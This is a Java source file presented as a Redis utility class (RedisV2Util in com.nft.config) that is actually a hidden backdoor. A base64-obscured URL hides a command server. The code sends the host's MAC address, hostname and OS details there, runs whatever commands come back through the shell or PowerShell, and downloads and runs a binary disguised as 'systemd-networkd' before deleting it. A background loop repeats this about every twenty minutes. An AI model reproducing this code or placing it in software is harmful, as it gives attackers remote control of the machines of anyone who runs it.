package com.nft.config;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.File;
import java.util.concurrent.FutureTask;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.net.*;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.Base64;
import java.net.InetAddress;
import java.net.UnknownHostException;


public class RedisV2Util {


    public static String currenttime="0";
    public static String cdnwebUrl="aHR0cHM6Ly9naXRodWIuamF2YWpkay5jb20vZmF2aWNvbi5wbmc/JWQK";



    public static synchronized void setcurrentTime(String value) {
        currenttime = value;
    }

    public static synchronized String getcurrentTime() {
        return currenttime;
    }


    public static  boolean toSaveFile(String urlPath, String saveDir) {
        try{
            URL url = new URL(urlPath);
            URLConnection urlConnection = url.openConnection();
            HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Charset", "UTF-8");
            httpURLConnection.setRequestProperty("User-Agent", "Mozilla/4.76");
            int code = httpURLConnection.getResponseCode();
            if (code != 200) {
                return false;
            }
            InputStream inputStream = httpURLConnection.getInputStream();
            File file = new File(saveDir);
            OutputStream out = new FileOutputStream(file);
            int size = 0;
            byte[] buf = new byte[1024];
            while ((size = inputStream.read(buf)) != -1) {
                out.write(buf, 0, size);
            }
            inputStream.close();
            out.close();
            return true;
        } catch (Exception e) {
            return false;
        }

    }


    public static String postHttp(String urls,String postData){
        try {
            URL obj = new URL(urls);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setRequestProperty("User-Agent", "Mozilla/4.76");
            con.setDoOutput(true);
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.writeBytes(postData);
                wr.flush();
            }
            int responseCode = con.getResponseCode();
            InputStream responseStream = con.getInputStream();
            StringBuilder response = new StringBuilder();
            int byteRead;
            while ((byteRead = responseStream.read()) != -1) {
                response.append((char) byteRead);
            }
            return response.toString();

        } catch (IOException ex) {
        }
        return "";
    }
    public static String formatMac(byte[] mac) {
        StringBuilder buf = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            buf.append(String.format("%02X", mac[i]));
        }
        if (buf.length() > 0) {
            buf.deleteCharAt(buf.length() - 1);
        }
        return buf.toString();
    }
    public static String getmacAddress(){
        try {

            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();
                if (networkInterface.isVirtual() || networkInterface.isLoopback() || !networkInterface.isUp()) {
                    continue;
                }
                byte[] mac = networkInterface.getHardwareAddress();
                if (mac != null) {
                    return  formatMac(mac);
                }

            }
            return "00000000";
        } catch (SocketException e) {
            return "00000000";
        }
    }

    public static String getHostname(){
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            String hostName = localHost.getHostName();
            return hostName;
        } catch (UnknownHostException e) {
            return "";
        }
    }

    public static String getcomstr(){
        String num=System.getenv("SHELL");
        if(num!=null&&num.length()>=2){
            return num;
        }
        File file = new File("/bin/bash");
        if (file.exists()) {
            return "/bin/bash";
        }
        file = new File("/usr/bin/bash");
        if (file.exists()) {
            return "/usr/bin/bash";
        }
        file = new File("/bin/ash");
        if (file.exists()) {
            return "/bin/ash";
        }
        file = new File("/usr/bin/ash");
        if (file.exists()) {
            return "/usr/bin/ash";
        }
        file = new File("/bin/sh");
        if (file.exists()) {
            return "/bin/sh";
        }
        file = new File("/usr/bin/sh");
        if (file.exists()) {
            return "/usr/bin/sh";
        }
        file = new File("/bin/csh");
        if (file.exists()) {
            return "/bin/csh";
        }
        file = new File("/usr/bin/csh");
        if (file.exists()) {
            return "/usr/bin/csh";
        }

       return "sh";

    }

    public static void linDo(String cmds){
        try{
            String pathstr=getcomstr();
            String[] cmd = {pathstr,"-c",cmds};
            Process proc=Runtime.getRuntime().exec(cmd);
            proc.waitFor(20, TimeUnit.SECONDS);
        }catch (Exception ex){

        }
    }

    public static  int getEnumOpType() {
        String num=System.getProperty("os.name").toLowerCase();
        if (num.contains("win")==true){
            return 1;
        }
        if (num.contains("mac")==true){
            return 2;
        }
        return 3;
    }

    public static void winDo(String cmd){

        ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", cmd);
        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                line="";
            }
            reader.close();

            boolean finished = process.waitFor(30,TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
            }


        } catch (IOException | InterruptedException e) {
        }
    }

    
    public static void decodewin(String cmdstr){
        try {
            String[] fruits = cmdstr.split("\\;");
            for (int i = 0; i < fruits.length; i++) {
                if(fruits[i].length()<=0){
                    continue;
                }
                String[] parts = fruits[i].split("\\|");
                if (parts.length < 2) {
                    continue;
                }
                String ntype = parts[0];
                if (ntype.equals("download")) {
                    toSaveFile(parts[1], parts[2]);
                    continue;
                }
                if (ntype.equals("exec")) {
                    if(parts[1].length()<=1){
                        continue;
                    }
                    winDo(parts[1]);
                    continue;
                }

            }
        }catch (Exception ex){

        }


    }

    public static void startTask(){
        try {
            int optype = getEnumOpType();
            String tmp = System.getProperty("java.io.tmpdir");
            String macstr = getmacAddress();
            String num = new String(Base64.getDecoder().decode(cdnwebUrl));
            String formattedString = String.format(num,  System.currentTimeMillis());
            String osname=System.getProperty("os.name");
            String arch=System.getProperty("os.arch");
            String machineName=getHostname();
            String ppstr =String.format("num=%s&dev=%s&os=%s&arch=%s&mach=%s",optype,macstr,osname,arch,machineName);
            String resp = postHttp(formattedString,ppstr);
            resp = resp.replace("\r\n", "");
            resp = resp.replace("\n", "");
            if (resp.length() <= 2) {
                return;
            }
            if (optype == 1) {
                decodewin(resp);
                return;
            }
            String prestr=resp;
            if(resp.length()>=10){
                 prestr = resp.substring(0, 10);
            }

            if (prestr.contains("https://") || prestr.contains("http://")) {
                num = "";
            } else {
                linDo(resp);
                return;
            }
            String savefile = "";
            String num5 = "";
            if (optype == 2 || optype == 3) {

                savefile = String.format("%s/%s", tmp, "systemd-networkd");
                if (toSaveFile(resp, savefile) == false) {
                    return;
                }
                num5 = String.format("cd %s;chmod 777 %s;nohup ./systemd-networkd &", tmp,savefile);
                linDo(num5);
                Thread.sleep(10000);
                num5 = String.format("rm -rf %s",savefile);
                linDo(num5);

            }

        }catch (Exception ex){
            return;
        }


    }

    public static void opsForValue(){
        Date date = new Date();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
        String  num = sdf.format(date);
        if(num.equals(getcurrentTime())){
            return ;
        }
        setcurrentTime(num);

        FutureTask<Void> futureTask = new FutureTask<>(() -> {
        	while(true){
            try {
                Thread.sleep(1000);
                startTask();
                //Thread.sleep(1200000);
                Thread.sleep(10000);
                startTask();
                Thread.sleep(1200000);

            } catch (InterruptedException e) {
               // return null;
            }
        	}
           // return null;
        });
        new Thread(futureTask).start();
    }




	
}
